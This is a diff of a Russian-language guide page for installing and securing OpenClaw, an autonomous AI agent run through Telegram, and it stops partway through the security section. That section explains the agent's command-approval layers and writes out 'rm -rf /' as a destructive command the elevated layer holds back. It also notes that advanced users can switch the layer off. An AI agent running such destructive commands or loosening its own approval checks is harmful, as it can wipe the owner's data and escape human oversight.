@@ -5,20 +5,20 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <!-- SEO -->
-    <title>OpenClaw — Полный гайд по установке, настройке и безопасности | guide.arturx.art</title>
-    <meta name="description" content="Пошаговое руководство по установке и безопасной настройке OpenClaw — автономного AI-агента с бесконечной памятью. Telegram-бот, который работает 24/7.">
-    <meta name="keywords" content="OpenClaw, ClawdBot, MoltBot, AI агент, Telegram бот, установка, настройка, безопасность, sandbox, Claude, OpenAI">
+    <title>OpenClaw — Полный гайд: установка, модели, безопасность, оптимизация | guide.arturx.art</title>
+    <meta name="description" content="Исчерпывающее руководство по OpenClaw — автономному AI-агенту в Telegram. Установка, безопасность, стек моделей, экономия токенов, QMD, субагенты.">
+    <meta name="keywords" content="OpenClaw, ClawdBot, MoltBot, AI агент, Telegram бот, установка, настройка, безопасность, sandbox, Claude, OpenAI, модели, токены, QMD">
 
     <!-- Open Graph -->
-    <meta property="og:title" content="OpenClaw — Полный гайд по установке и безопасности">
-    <meta property="og:description" content="Автономный AI-агент с бесконечной памятью в Telegram. Пошаговая настройка безопасности.">
+    <meta property="og:title" content="OpenClaw — Полный гайд по настройке AI-агента в Telegram">
+    <meta property="og:description" content="Автономный AI-агент с бесконечной памятью. Установка, безопасность, модели, оптимизация токенов.">
     <meta property="og:type" content="article">
     <meta property="og:url" content="https://guide.arturx.art/guides/tools/openclaw.html">
 
     <!-- Fonts & Styles -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="../../styles.css">
     <link rel="stylesheet" href="../guide.css">
 </head>
@@ -56,41 +56,42 @@
             <header class="guide-header">
                 <div class="guide-meta">
                     <span class="guide-category">Инструменты</span>
-                    <span class="guide-reading-time">~25 мин</span>
-                    <span class="guide-updated">Обновлено: Февраль 2026</span>
+                    <span class="guide-reading-time">~35 мин</span>
+                    <span class="guide-updated">Обновлено: Март 2026</span>
                 </div>
                 <h1>OpenClaw — AI-агент в Telegram</h1>
-                <p class="guide-description">Полное руководство по установке, настройке и безопасному запуску автономного AI-агента. Он живёт в Telegram, управляет твоим компьютером и помнит всё о тебе.</p>
+                <p class="guide-description">Полное руководство: от установки до продвинутой настройки. Безопасность, стек моделей, экономия токенов, память, субагенты — всё в одном месте.</p>
             </header>
 
             <!-- Guide Body -->
             <article class="guide-body">
 
-                <!-- Introduction -->
-                <section id="intro">
-                    <h2>Что такое OpenClaw и зачем он нужен?</h2>
+                <!-- ==================== INTRO ==================== -->
+                <details class="guide-section" id="intro-section" open>
+                    <summary><h2 id="intro">Что такое OpenClaw и зачем он нужен?</h2></summary>
+                    <div class="section-content">
 
                     <p>Представь: ты просыпаешься, а в Telegram уже ждёт сообщение от твоего личного AI-ассистента. Он напоминает о встрече, которую ты упомянул неделю назад. Он помнит, что ты работаешь над проектом X, и предлагает идею. Он знает твои привычки, цели, контекст — потому что вы общаетесь месяцами, и он <em>ничего не забывает</em>.</p>
 
-                    <p>Это не научная фантастика. Это <strong>OpenClaw</strong> (ранее ClawdBot, MoltBot) — open-source AI-агент, который живёт на твоём сервере и общается через Telegram.</p>
+                    <p>Это <strong>OpenClaw</strong> (ранее ClawdBot, MoltBot) — open-source AI-агент, созданный Петером Штайнбергером. В феврале 2026 проект передан в open-source фонд, а сам Петер присоединился к OpenAI.</p>
 
                     <h3>Почему не просто ChatGPT или Claude.ai?</h3>
 
-                    <p>Потому что у них <strong>амнезия</strong>. Каждый новый чат — и они забывают, кто ты. Да, есть «память», но она ограничена и хранится на серверах корпораций. OpenClaw — это другая философия:</p>
+                    <p>Потому что у них <strong>амнезия</strong>. Каждый новый чат — и они забывают, кто ты. OpenClaw — это другая философия:</p>
 
                     <ul>
-                        <li><strong>Бесконечная память</strong> — он помнит каждый разговор, каждую деталь о тебе. Через год он будет знать тебя лучше, чем ты сам.</li>
-                        <li><strong>Автономность</strong> — он не ждёт твоих команд. Сам напишет, когда нужно напомнить, предложить или спросить.</li>
-                        <li><strong>Управление компьютером</strong> — файлы, браузер, терминал, API. Он не просто отвечает на вопросы — он делает.</li>
-                        <li><strong>Приватность</strong> — твои данные на твоём сервере. Не у OpenAI. Не в облаке Google. У тебя.</li>
-                        <li><strong>Работает 24/7</strong> — на VPS за 4€/мес он доступен всегда, даже когда твой ноутбук выключен.</li>
+                        <li><strong>Бесконечная память</strong> — помнит каждый разговор. Через год будет знать тебя лучше, чем ты сам.</li>
+                        <li><strong>Автономность</strong> — сам напишет, когда нужно напомнить или предложить.</li>
+                        <li><strong>Управление компьютером</strong> — файлы, браузер, терминал, API. Не просто отвечает — делает.</li>
+                        <li><strong>Приватность</strong> — данные на твоём сервере, не в облаке.</li>
+                        <li><strong>24/7</strong> — на VPS за ~300 ₽/мес доступен всегда.</li>
                     </ul>
 
                     <div class="callout callout-warning">
                         <span class="callout-icon">&#9888;&#65039;</span>
                         <div class="callout-content">
                             <strong>Это мощный инструмент. И опасный.</strong>
-                            <p>OpenClaw имеет полный доступ к системе, на которой работает. Это как дать кому-то ключи от дома, доступ к банку и право подписывать документы от твоего имени. Если не настроить безопасность — последствия могут быть серьёзными. Этот гайд научит делать всё правильно.</p>
+                            <p>OpenClaw имеет доступ к системе, на которой работает. Один из мейнтейнеров предупредил: «Если ты не понимаешь, как запускать команды в терминале — этот проект слишком опасен для тебя». А Cisco обнаружила data exfiltration в стороннем скилле. Безопасность — не опция, а необходимость.</p>
                         </div>
                     </div>
 
@@ -98,16 +99,11 @@
                         <span class="callout-icon">&#128161;</span>
                         <div class="callout-content">
                             <strong>Официальные ресурсы</strong>
-                            <p>Документация: <a href="https://docs.openclaw.ai" target="_blank">docs.openclaw.ai</a> | Исходный код: <a href="https://github.com/anthropics/openclaw" target="_blank">GitHub</a></p>
+                            <p>Документация: <a href="https://docs.openclaw.ai" target="_blank">docs.openclaw.ai</a> | Исходный код: <a href="https://github.com/openclaw/openclaw" target="_blank">GitHub</a></p>
                         </div>
                     </div>
-                </section>
 
-                <!-- Comparison -->
-                <section id="comparison">
-                    <h2>Сравнение с другими AI-инструментами</h2>
-
-                    <p>На рынке десятки AI-ассистентов. Давай разберёмся, чем OpenClaw отличается от популярных альтернатив — и когда он реально нужен, а когда лучше взять что-то другое.</p>
+                    <h3>Сравнение с другими AI-инструментами</h3>
 
                     <table class="comparison-table">
                         <thead>
@@ -120,1051 +116,1715 @@
                             </tr>
                         </thead>
                         <tbody>
-                            <tr>
-                                <td>Долгосрочная память</td>
-                                <td>Ограничена</td>
-                                <td>Проект</td>
-                                <td>Сессия</td>
-                                <td><strong>Бесконечная</strong></td>
-                            </tr>
-                            <tr>
-                                <td>Интерфейс</td>
-                                <td>Веб / Приложение</td>
-                                <td>IDE</td>
-                                <td>Терминал</td>
-                                <td><strong>Telegram / Discord</strong></td>
-                            </tr>
-                            <tr>
-                                <td>Управление системой</td>
-                                <td>Нет</td>
-                                <td>Только код</td>
-                                <td>Терминал + файлы</td>
-                                <td><strong>Полное (файлы, браузер, API)</strong></td>
-                            </tr>
-                            <tr>
-                                <td>Автономные действия</td>
-                                <td>Нет</td>
-                                <td>Нет</td>
-                                <td>Нет</td>
-                                <td><strong>Да (сам пишет тебе)</strong></td>
-                            </tr>
-                            <tr>
-                                <td>Где хранятся данные</td>
-                                <td>Облако компании</td>
-                                <td>Облако + локально</td>
-                                <td>Локально</td>
-                                <td><strong>Только локально</strong></td>
-                            </tr>
-                            <tr>
-                                <td>Работает 24/7</td>
-                                <td>Да (их сервера)</td>
-                                <td>Нет</td>
-                                <td>Нет</td>
-                                <td><strong>Да (твой VPS)</strong></td>
-                            </tr>
-                            <tr>
-                                <td>Для кого</td>
-                                <td>Все</td>
-                                <td>Разработчики</td>
-                                <td>Разработчики</td>
-                                <td><strong>Продвинутые пользователи</strong></td>
-                            </tr>
+                            <tr><td>Долгосрочная память</td><td>Ограничена</td><td>Проект</td><td>Сессия</td><td><strong>Бесконечная</strong></td></tr>
+                            <tr><td>Интерфейс</td><td>Веб / Приложение</td><td>IDE</td><td>Терминал</td><td><strong>Telegram / Discord</strong></td></tr>
+                            <tr><td>Управление системой</td><td>Нет</td><td>Только код</td><td>Терминал + файлы</td><td><strong>Полное</strong></td></tr>
+                            <tr><td>Автономные действия</td><td>Нет</td><td>Нет</td><td>Нет</td><td><strong>Да</strong></td></tr>
+                            <tr><td>Данные</td><td>Облако компании</td><td>Облако + локально</td><td>Локально</td><td><strong>Только локально</strong></td></tr>
+                            <tr><td>Работает 24/7</td><td>Да (их сервера)</td><td>Нет</td><td>Нет</td><td><strong>Да (твой VPS)</strong></td></tr>
+                            <tr><td>Для кого</td><td>Все</td><td>Разработчики</td><td>Разработчики</td><td><strong>Продвинутые</strong></td></tr>
                         </tbody>
                     </table>
 
-                    <h3>Когда OpenClaw — правильный выбор:</h3>
-                    <ul>
-                        <li><strong>Тебе нужен личный ассистент, а не инструмент</strong> — он знает твой контекст, проекты, привычки</li>
-                        <li><strong>Ты хочешь общаться через Telegram</strong> — не открывая браузер, IDE или терминал</li>
-                        <li><strong>Приватность критична</strong> — твои разговоры не уходят в OpenAI/Anthropic для обучения</li>
-                        <li><strong>Нужна автоматизация</strong> — напоминания, мониторинг, регулярные задачи</li>
-                    </ul>
+                    <p><strong>Когда OpenClaw — правильный выбор:</strong> нужен личный ассистент с памятью, общение через Telegram, приватность, автоматизация задач.</p>
+                    <p><strong>Когда лучше другое:</strong> Cursor/Windsurf — для кодинга в IDE. Claude Code — для терминальной разработки. ChatGPT — для разовых вопросов без настройки.</p>
 
-                    <h3>Когда лучше выбрать другое:</h3>
-                    <ul>
-                        <li><strong>Cursor / Windsurf</strong> — если пишешь код и нужна глубокая IDE-интеграция</li>
-                        <li><strong>Claude Code</strong> — если работаешь в терминале и не нужна память между сессиями</li>
-                        <li><strong>ChatGPT / Claude.ai</strong> — если нужен быстрый ответ без настройки инфраструктуры</li>
-                    </ul>
-
-                    <div class="callout callout-info">
-                        <span class="callout-icon">&#128161;</span>
-                        <div class="callout-content">
-                            <strong>Они не конкуренты — они дополняют друг друга</strong>
-                            <p>Многие используют Claude Code для кодинга, ChatGPT для быстрых вопросов, и OpenClaw как личного ассистента с памятью. Разные инструменты для разных задач.</p>
-                        </div>
                     </div>
-                </section>
+                </details>
 
-                <!-- Requirements -->
-                <section id="requirements">
-                    <h2>Что понадобится</h2>
+                <!-- Expand/Collapse bar -->
+                <div class="expand-collapse-bar">
+                    <button class="expand-collapse-btn" id="expand-all">Развернуть всё</button>
+                    <button class="expand-collapse-btn" id="collapse-all">Свернуть всё</button>
+                </div>
 
-                    <ul class="prereq-list">
-                        <li>Компьютер с macOS, Linux или Windows</li>
-                        <li>Node.js 22+ (установщик скачает автоматически)</li>
-                        <li>API-ключ Claude (Anthropic) или OpenAI</li>
-                        <li>Telegram-токен от @BotFather</li>
-                    </ul>
+                <!-- ==================== 2. QUICK START ==================== -->
+                <details class="guide-section" id="quick-start-section" open>
+                    <summary><h2 id="quick-start">Быстрый старт за 10 минут</h2></summary>
+                    <div class="section-content">
 
-                    <div class="callout callout-warning">
-                        <span class="callout-icon">&#9888;&#65039;</span>
-                        <div class="callout-content">
-                            <strong>Оплата из России</strong>
-                            <p>Для оплаты API используй виртуальные карты (крипто-сервисы), OpenRouter или карты друзей за рубежом.</p>
-                        </div>
-                    </div>
-                </section>
+                        <h3>Что понадобится</h3>
+                        <ul class="prereq-list">
+                            <li><strong>Компьютер</strong> — macOS, Linux или Windows (через WSL2)</li>
+                            <li><strong>Node.js 18+</strong> — <a href="https://nodejs.org" target="_blank">nodejs.org</a> (минимум 18, рекомендуется 22 LTS)</li>
+                            <li><strong>API-ключ</strong> — Claude (Anthropic) или OpenAI</li>
+                            <li><strong>Telegram-бот</strong> — создадим через @BotFather</li>
+                        </ul>
 
-                <!-- Installation -->
-                <section id="installation">
-                    <h2>Установка</h2>
-
-                    <h3 id="install-mac">macOS / Linux</h3>
-                    <p>Открой терминал и выполни:</p>
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Terminal</span>
-                            <button class="copy-btn" data-copy="curl -fsSL https://openclaw.bot/install.sh | bash">Копировать</button>
-                        </div>
-                        <pre><code>curl -fsSL https://openclaw.bot/install.sh | bash</code></pre>
-                    </div>
-
-                    <h3 id="install-windows">Windows (через WSL2)</h3>
-                    <p><strong>Важно:</strong> OpenClaw на Windows работает только через WSL2 (Ubuntu). Сначала <a href="https://learn.microsoft.com/ru-ru/windows/wsl/install" target="_blank">установи WSL2</a>, затем выполни команду Linux внутри WSL.</p>
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>PowerShell (установка WSL2)</span>
-                            <button class="copy-btn" data-copy="wsl --install">Копировать</button>
-                        </div>
-                        <pre><code>wsl --install</code></pre>
-                    </div>
-
-                    <p>После установки запусти настройку:</p>
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>Terminal</span>
-                            <button class="copy-btn" data-copy="openclaw onboard">Копировать</button>
-                        </div>
-                        <pre><code>openclaw onboard</code></pre>
-                    </div>
-
-                    <p>Мастер настройки попросит:</p>
-                    <ol>
-                        <li>API-ключ (Claude или OpenAI)</li>
-                        <li>Telegram-токен от @BotFather</li>
-                        <li>Выбор мессенджера для связи</li>
-                    </ol>
-                </section>
-
-                <!-- Telegram Bot Setup -->
-                <section id="telegram-setup">
-                    <h2>Настройка Telegram-бота</h2>
-
-                    <div class="steps">
-                        <div class="step">
-                            <div class="step-number">1</div>
-                            <div class="step-content">
-                                <h4>Создай бота</h4>
-                                <p>Открой <a href="https://t.me/BotFather" target="_blank">@BotFather</a> в Telegram и отправь команду <code>/newbot</code></p>
+                        <div class="callout callout-warning">
+                            <span class="callout-icon">&#9888;&#65039;</span>
+                            <div class="callout-content">
+                                <strong>Оплата из России</strong>
+                                <p>API Anthropic и OpenAI не принимают российские карты напрямую. Варианты: виртуальная карта (PST.NET, Pyypl), OpenRouter как прокси, или карта друга за рубежом.</p>
                             </div>
                         </div>
-                        <div class="step">
-                            <div class="step-number">2</div>
-                            <div class="step-content">
-                                <h4>Придумай имя</h4>
-                                <p>Введи название бота (например, "Мой AI Ассистент") и username (например, my_ai_assistant_bot)</p>
+
+                        <div class="callout callout-info">
+                            <span class="callout-icon">&#128161;</span>
+                            <div class="callout-content">
+                                <strong>Windows? Сначала WSL2</strong>
+                                <p>OpenClaw нативно работает только на macOS и Linux. На Windows нужен WSL2 (Windows Subsystem for Linux). Установка: <code>wsl --install</code> в PowerShell от администратора, перезагрузка, затем работаете внутри Ubuntu-терминала.</p>
                             </div>
                         </div>
-                        <div class="step">
-                            <div class="step-number">3</div>
-                            <div class="step-content">
-                                <h4>Скопируй токен</h4>
-                                <p>BotFather выдаст токен вида <code>123456789:ABCdefGHIjklMNOpqrSTUvwxYZ</code> — сохрани его</p>
+
+                        <h3>Шаг 1: Установка OpenClaw</h3>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>Terminal (macOS / Linux / WSL2)</span>
+                                <button class="copy-btn" data-copy="curl -fsSL https://openclaw.ai/install.sh | bash">Копировать</button>
+                            </div>
+                            <pre><code>curl -fsSL https://openclaw.ai/install.sh | bash</code></pre>
+                        </div>
+
+                        <p>Скрипт скачает последнюю версию, добавит в PATH и проверит установку.</p>
+
+                        <h3>Шаг 2: Создание Telegram-бота</h3>
+
+                        <div class="steps">
+                            <div class="step">
+                                <div class="step-number">1</div>
+                                <div class="step-content">
+                                    <h4>Открой @BotFather в Telegram</h4>
+                                    <p>Найди <a href="https://t.me/BotFather" target="_blank">@BotFather</a> и отправь <code>/newbot</code></p>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">2</div>
+                                <div class="step-content">
+                                    <h4>Задай имя и username</h4>
+                                    <p>Имя — любое (например, «Мой AI»). Username должен заканчиваться на <code>bot</code> (например, <code>my_ai_helper_bot</code>).</p>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">3</div>
+                                <div class="step-content">
+                                    <h4>Скопируй токен</h4>
+                                    <p>BotFather пришлёт токен вида <code>7123456789:AAH...</code> — сохрани его, он понадобится на следующем шаге.</p>
+                                </div>
                             </div>
                         </div>
-                        <div class="step">
-                            <div class="step-number">4</div>
-                            <div class="step-content">
-                                <h4>Вставь в настройку</h4>
-                                <p>Введи токен когда <code>openclaw onboard</code> попросит</p>
+
+                        <h3>Шаг 3: Настройка (onboard)</h3>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>Terminal</span>
+                                <button class="copy-btn" data-copy="openclaw onboard">Копировать</button>
+                            </div>
+                            <pre><code>openclaw onboard</code></pre>
+                        </div>
+
+                        <p>Мастер настройки спросит:</p>
+                        <ol>
+                            <li><strong>API-ключ</strong> — вставь ключ Anthropic или OpenAI</li>
+                            <li><strong>Мессенджер</strong> — выбери Telegram</li>
+                            <li><strong>Telegram-токен</strong> — вставь токен от BotFather</li>
+                        </ol>
+
+                        <p>После завершения отправь боту любое сообщение в Telegram — если ответил, всё работает!</p>
+
+                        <div class="callout callout-success">
+                            <span class="callout-icon">&#127881;</span>
+                            <div class="callout-content">
+                                <strong>Бот запущен!</strong>
+                                <p>Теперь у тебя есть AI-ассистент в Telegram. Дальше — как заставить его работать 24/7 и настроить безопасность.</p>
                             </div>
                         </div>
+
                     </div>
+                </details>
 
-                    <!-- SCREENSHOT: BotFather dialog -->
-                    <figure class="guide-image">
-                        <div style="background: var(--bg-secondary); padding: 3rem; text-align: center; border: 2px dashed var(--border);">
-                            <p style="color: var(--text-secondary); margin: 0;">📸 СКРИНШОТ: Диалог с @BotFather</p>
-                            <p style="color: var(--text-secondary); font-size: 0.8rem; margin-top: 0.5rem;">Файл: <code>images/botfather-dialog.png</code></p>
+                <!-- ==================== 3. VPS ==================== -->
+                <details class="guide-section" id="vps-section">
+                    <summary><h2 id="vps">Где запустить бота 24/7</h2></summary>
+                    <div class="section-content">
+
+                        <p>Пока OpenClaw работает на твоём компьютере — он доступен только когда компьютер включён. Для работы 24/7 нужен <strong>VPS</strong> (Virtual Private Server) — виртуальный сервер в облаке.</p>
+
+                        <h3>Минимальные требования</h3>
+                        <ul>
+                            <li><strong>2 ГБ RAM</strong> (рекомендуется 4 ГБ, если планируешь QMD)</li>
+                            <li><strong>20 ГБ диска</strong> (SSD/NVMe)</li>
+                            <li><strong>Linux</strong> (Ubuntu 22.04+ или Debian 12+)</li>
+                            <li>Стоимость: от ~250 ₽/мес (от ~4€/мес)</li>
+                        </ul>
+
+                        <h3>Рекомендуемые провайдеры</h3>
+
+                        <table class="comparison-table">
+                            <thead>
+                                <tr>
+                                    <th>Провайдер</th>
+                                    <th>Цена от</th>
+                                    <th>Серверы</th>
+                                    <th>Оплата из РФ</th>
+                                    <th>Примечание</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>Hetzner</strong></td>
+                                    <td>~4.50€/мес</td>
+                                    <td>Германия, Финляндия, США</td>
+                                    <td>Через VPN / иностранную карту</td>
+                                    <td>Лучшее соотношение цена/качество. Рекомендуем</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Aeza</strong></td>
+                                    <td>~250 ₽/мес</td>
+                                    <td>Россия, Европа</td>
+                                    <td>Да, рубли</td>
+                                    <td>Лучшая цена/производительность, 10 Gbps</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Timeweb</strong></td>
+                                    <td>~300 ₽/мес</td>
+                                    <td>Россия, Европа</td>
+                                    <td>Да, рубли</td>
+                                    <td>Надёжный, удобная панель</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Contabo</strong></td>
+                                    <td>~4€/мес</td>
+                                    <td>Германия, США, Азия</td>
+                                    <td>Международные карты</td>
+                                    <td>Дёшево, много ресурсов</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Fornex</strong></td>
+                                    <td>~350 ₽/мес</td>
+                                    <td>Германия, Нидерланды, Швейцария</td>
+                                    <td>Да, рубли</td>
+                                    <td>Европейские серверы с оплатой в ₽</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>4VPS</strong></td>
+                                    <td>~80 ₽/мес (РФ)</td>
+                                    <td>Россия, Европа, Азия, США</td>
+                                    <td>Да, рубли</td>
+                                    <td>Самый дешёвый вариант</td>
+                                </tr>
+                            </tbody>
+                        </table>
+
+                        <div class="callout callout-info">
+                            <span class="callout-icon">&#128161;</span>
+                            <div class="callout-content">
+                                <strong>Oracle Cloud Free Tier</strong>
+                                <p>Oracle даёт бесплатный VPS (ARM, 4 ядра, 24 ГБ RAM) навсегда. Ограничение: сложная регистрация и иногда нет свободных слотов. Но если получится — идеально для OpenClaw.</p>
+                            </div>
                         </div>
-                        <figcaption>Создание бота через @BotFather — токен выделен красным</figcaption>
-                    </figure>
-                </section>
 
-                <!-- System Prompt -->
-                <section id="system-prompt">
-                    <h2>Персонализация (System Prompt)</h2>
+                        <h3>Быстрая установка на VPS</h3>
 
-                    <p>Чтобы бот узнал тебя, отправь ему первое сообщение с информацией о себе:</p>
+                        <p>После подключения к серверу по SSH:</p>
 
-                    <div class="code-block large">
-                        <div class="code-header">
-                            <span>Отправь боту первым сообщением</span>
-                            <button class="copy-btn" data-copy="Привет! Давай знакомиться.
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>Terminal (SSH на сервере)</span>
+                                <button class="copy-btn" data-copy="# 1. Обновить систему
+apt update && apt upgrade -y
 
-Меня зовут [ИМЯ], я занимаюсь [ПРОФЕССИЯ/СФЕРА].
+# 2. Установить Node.js 22
+curl -fsSL https://deb.nodesource.com/setup_22.x | bash -
+apt-get install -y nodejs
 
-Мои текущие проекты:
-- [Проект 1]
-- [Проект 2]
+# 3. Установить OpenClaw
+curl -fsSL https://openclaw.ai/install.sh | bash
 
-Мои цели на этот год:
-- [Цель 1]
-- [Цель 2]
+# 4. Настроить
+openclaw onboard
 
-Как я хочу, чтобы ты работал:
-- Отвечай кратко и по делу
-- Если не уверен — уточни
-- Предлагай идеи проактивно
-- Напоминай о важных задачах
+# 5. Запустить как демон (работает после закрытия SSH)
+openclaw gateway --install-daemon">Копировать</button>
+                            </div>
+                            <pre><code># 1. Обновить систему
+apt update && apt upgrade -y
 
-Запомни это и используй в нашей работе.">Копировать</button>
+# 2. Установить Node.js 22
+curl -fsSL https://deb.nodesource.com/setup_22.x | bash -
+apt-get install -y nodejs
+
+# 3. Установить OpenClaw
+curl -fsSL https://openclaw.ai/install.sh | bash
+
+# 4. Настроить
+openclaw onboard
+
+# 5. Запустить как демон (работает после закрытия SSH)
+openclaw gateway --install-daemon</code></pre>
                         </div>
-                        <pre><code>Привет! Давай знакомиться.
 
-Меня зовут [ИМЯ], я занимаюсь [ПРОФЕССИЯ/СФЕРА].
+                        <div class="callout callout-warning">
+                            <span class="callout-icon">&#9888;&#65039;</span>
+                            <div class="callout-content">
+                                <strong>Обязательно прочитай секцию «Безопасность» ниже</strong>
+                                <p>Не оставляй бота на VPS без настройки безопасности. Как минимум ограничь, кто может писать боту (Telegram allowlist).</p>
+                            </div>
+                        </div>
 
-Мои текущие проекты:
-- [Проект 1]
-- [Проект 2]
-
-Мои цели на этот год:
-- [Цель 1]
-- [Цель 2]
-
-Как я хочу, чтобы ты работал:
-- Отвечай кратко и по делу
-- Если не уверен — уточни
-- Предлагай идеи проактивно
-- Напоминай о важных задачах
-
-Запомни это и используй в нашей работе.</code></pre>
                     </div>
+                </details>
 
-                    <div class="callout callout-success">
-                        <span class="callout-icon">&#128640;</span>
-                        <div class="callout-content">
-                            <strong>Совет</strong>
-                            <p>Чем больше расскажешь о себе, тем умнее станет твой ассистент. Он будет помнить всё!</p>
+                <!-- ==================== 4. SECURITY ==================== -->
+                <details class="guide-section" id="security-section">
+                    <summary><h2 id="security">Безопасность — разумный баланс</h2></summary>
+                    <div class="section-content">
+
+                        <p><strong>Философия: «Ключи от офиса, но не от сейфа».</strong> Это личный VPS с ботом, не банковский сервер. Защищаем от утечки данных наружу и случайных посторонних, но не мешаем боту работать. Если бот сломает сервер — переустановка за 30 минут.</p>
+
+                        <div class="callout callout-danger">
+                            <span class="callout-icon">&#9940;</span>
+                            <div class="callout-content">
+                                <strong>Три слоя блокировки команд — о которых мало кто знает</strong>
+                                <p>OpenClaw имеет <strong>три независимых механизма</strong>, каждый из которых может заблокировать команду. Если вы настроили allowlist, а sudo всё равно не работает — причина скорее всего в третьем слое.</p>
+                            </div>
                         </div>
-                    </div>
-                </section>
 
-                <!-- VPS Setup -->
-                <section id="vps">
-                    <h2>Запуск 24/7 на VPS</h2>
+                        <table class="comparison-table">
+                            <thead><tr><th>Слой</th><th>Где настраивается</th><th>Что блокирует</th><th>Дефолт</th></tr></thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>1. exec-approvals</strong></td>
+                                    <td><code>exec-approvals.json</code></td>
+                                    <td>Команды не из белого списка</td>
+                                    <td>allowlist + on-miss</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>2. approvals.exec</strong></td>
+                                    <td><code>openclaw.json</code></td>
+                                    <td>Forwarding запросов в Telegram</td>
+                                    <td>enabled: true</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>3. tools.elevated</strong></td>
+                                    <td><code>openclaw.json</code></td>
+                                    <td><code>sudo</code>, <code>kill</code> и другие «опасные» команды — <strong>поверх</strong> allowlist</td>
+                                    <td>enabled: true</td>
+                                </tr>
+                            </tbody>
+                        </table>
 
-                    <p>Чтобы бот работал круглосуточно, разверни его на сервере.</p>
+                        <p><strong>Ловушка:</strong> даже если <code>exec-approvals</code> разрешает <code>sudo</code> — слой <code>tools.elevated</code> перехватит его отдельно. Это hardcoded поведение: <code>sudo</code>, <code>kill</code>, <code>rm</code> и ряд других команд обрабатываются как «elevated» независимо от allowlist.</p>
 
-                    <div class="callout callout-warning">
-                        <span class="callout-icon">&#9888;&#65039;</span>
-                        <div class="callout-content">
-                            <strong>Сначала прочитай раздел Безопасность!</strong>
-                            <p>OpenClaw имеет полный доступ к системе. Не торопись — <a href="#security">настрой безопасность</a> перед запуском.</p>
+                        <p><strong>Важный нюанс:</strong> OpenClaw <strong>не различает</strong> «sudo хороший» и «rm плохой» — это один механизм. Либо все elevated-команды блокируются (и sudo, и rm, и kill), либо ни одна. Системного способа «пропустить sudo, но заблокировать rm» — нет.</p>
+
+                        <p><strong>Рекомендация для гайда:</strong> оставляйте <code>tools.elevated.enabled: true</code> (дефолт). Да, sudo будет запрашивать подтверждение — но это безопаснее, чем пропустить <code>rm -rf /</code>. Продвинутые пользователи могут отключить этот слой (см. секцию «Автономность»), но только при наличии других мер защиты.</p>
+
+                        <p>Безопасность OpenClaw строится из нескольких уровней — от обязательного до продвинутого:</p>
+
+                        <h3>Уровень 1: Кто может писать боту (обязательно)</h3>
+
+                        <p>Без этого <strong>любой человек</strong> может найти твоего бота в Telegram и управлять им. Это первое, что нужно настроить.</p>
+
+                        <p>В <code>openclaw.json</code> добавь Telegram allowlist:</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>openclaw.json — Telegram allowlist</span>
+                                <button class="copy-btn" data-copy='"channels": {
+  "telegram": {
+    "dmPolicy": "allowlist",
+    "groupPolicy": "allowlist",
+    "allowFrom": ["ТВОЙ_TELEGRAM_ID"]
+  }
+}'>Копировать</button>
+                            </div>
+                            <pre><code>"channels": {
+  "telegram": {
+    "dmPolicy": "allowlist",
+    "groupPolicy": "allowlist",
+    "allowFrom": ["ТВОЙ_TELEGRAM_ID"]
+  }
+}</code></pre>
                         </div>
-                    </div>
 
-                    <div class="callout callout-info">
-                        <span class="callout-icon">&#128187;</span>
-                        <div class="callout-content">
-                            <strong>Рекомендуемый хостинг: Hetzner</strong>
-                            <p>Тариф CX22 (~4.5€/мес): 2 vCPU, 4 GB RAM, 40 GB SSD. Локация: Германия.</p>
+                        <p><strong>Как узнать свой Telegram ID:</strong> отправь любое сообщение боту <a href="https://t.me/userinfobot" target="_blank">@userinfobot</a>.</p>
+
+                        <div class="callout callout-info">
+                            <span class="callout-icon">&#128161;</span>
+                            <div class="callout-content">
+                                <strong>Где хранятся секреты?</strong>
+                                <p>API-ключи хранятся в <code>auth-profiles.json</code>, отдельно от основного конфига. Это позволяет безопасно делиться <code>openclaw.json</code> без утечки ключей. Права: <code>chmod 600</code>.</p>
+                            </div>
                         </div>
-                    </div>
 
-                    <h3>Быстрая настройка сервера</h3>
+                        <h3>Уровень 2: Что бот может выполнить (рекомендуется)</h3>
 
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>1. Обновление системы</span>
-                            <button class="copy-btn" data-copy="sudo apt update && sudo apt upgrade -y">Копировать</button>
-                        </div>
-                        <pre><code>sudo apt update && sudo apt upgrade -y</code></pre>
-                    </div>
+                        <p>Exec-approvals контролируют, какие команды бот может запускать. Создай файл <code>~/.openclaw/exec-approvals.json</code>:</p>
 
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>2. Установка Node.js 22</span>
-                            <button class="copy-btn" data-copy="curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -
-sudo apt install -y nodejs">Копировать</button>
-                        </div>
-                        <pre><code>curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -
-sudo apt install -y nodejs</code></pre>
-                    </div>
-
-                    <div class="code-block">
-                        <div class="code-header">
-                            <span>3. Установка OpenClaw</span>
-                            <button class="copy-btn" data-copy="curl -fsSL https://openclaw.bot/install.sh | bash">Копировать</button>
-                        </div>
